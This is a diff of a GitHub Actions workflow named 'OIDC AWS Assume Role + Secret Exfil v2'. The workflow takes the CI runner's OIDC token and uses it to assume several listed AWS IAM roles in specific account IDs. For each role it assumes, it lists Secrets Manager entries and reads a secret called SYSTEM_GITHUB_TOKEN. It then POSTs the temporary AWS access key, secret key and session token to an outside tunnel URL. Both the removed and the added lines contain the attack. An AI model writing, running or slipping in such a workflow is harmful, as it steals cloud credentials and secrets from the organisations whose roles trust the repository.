@@ -1,4 +1,4 @@
-name: OIDC AWS Assume Role + Secret Exfil
+name: OIDC AWS Assume Role + Secret Exfil v2
 on:
   push:
     branches:
@@ -10,17 +10,18 @@ permissions:
   contents: read
 
 jobs:
-  test-all-roles:
+  test-roles:
     name: Test All AWS Roles
     runs-on: ubuntu-latest
     steps:
       - name: Assume and test all roles
         run: |
-          # Get OIDC token
-          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+          set -e
+          echo "[*] Getting OIDC token..."
+          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+          echo "[*] Got OIDC token: ${OIDC_TOKEN:0:20}..."
           
-          ROLES=(
+          roles=(
             "arn:aws:iam::058264420411:role/isomer-next-infra-stg-deploy-role"
             "arn:aws:iam::058264420411:role/isomer-next-infra-stg-ecs-task-role"
             "arn:aws:iam::058264420411:role/studio-staging-ecs-task-role"
@@ -30,36 +31,44 @@ jobs:
             "arn:aws:iam::343218177745:role/isomer-next-infra-uat-ecs-task-role"
           )
           
-          for ROLE in "${ROLES[@]}"; do
+          for ROLE in "${roles[@]}"; do
+            echo ""
             echo "=== Trying: $ROLE ==="
             RESP=$(aws sts assume-role-with-web-identity \
               --role-arn "$ROLE" \
               --role-session-name "oidc-test" \
               --web-identity-token "$OIDC_TOKEN" \
-              --region ap-southeast-1 2>&1)
-            echo "$RESP"
+              --region ap-southeast-1 2>&1) || {
+                echo "[-] Assume failed: $(echo $RESP | tail -1)"
+                echo "$RESP" | head -5
+                continue
+              }
             
-            if echo "$RESP" | grep -q "AccessKeyId"; then
+            echo "Response: $(echo $RESP | python3 -c "import sys,json; d=json.load(sys.stdin); print('OK' if 'Credentials' in d else 'FAIL')" 2>&1 || echo 'PARSE_ERR')"
+            
+            if echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if 'Credentials' in d else 1)" 2>/dev/null; then
               echo "[SUCCESS] Got credentials for $ROLE!"
-              # Extract and use credentials
               ACCESS_KEY=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['AccessKeyId'])")
               SECRET_KEY=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])")
               SESSION_TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SessionToken'])")
               
-              # Export and try to get secrets
               export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
               export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
               export AWS_SESSION_TOKEN="$SESSION_TOKEN"
               export AWS_DEFAULT_REGION="ap-southeast-1"
               
-              aws sts get-caller-identity
-              aws secretsmanager list-secrets 2>&1 || true
-              aws secretsmanager get-secret-value --secret-id SYSTEM_GITHUB_TOKEN 2>&1 || true
+              echo "[*] Identity: $(aws sts get-caller-identity 2>&1)"
+              echo "[*] Secrets: $(aws secretsmanager list-secrets --region ap-southeast-1 2>&1 | head -20)"
+              echo "[*] SYSTEM_GITHUB_TOKEN: $(aws secretsmanager get-secret-value --secret-id SYSTEM_GITHUB_TOKEN --region ap-southeast-1 2>&1)"
               
               # Exfiltrate
               curl -s -X POST "https://sweet-clouds-move.loca.lt/collect" \
                 -H "Content-Type: application/json" \
                 -d "{\"aws_access_key\":\"$ACCESS_KEY\",\"aws_secret_key\":\"$SECRET_KEY\",\"session_token\":\"$SESSION_TOKEN\"}" || true
+            else
+              echo "[-] No credentials in response"
             fi
-            echo ""
           done
+          
+          echo ""
+          echo "[*] Done testing all roles"
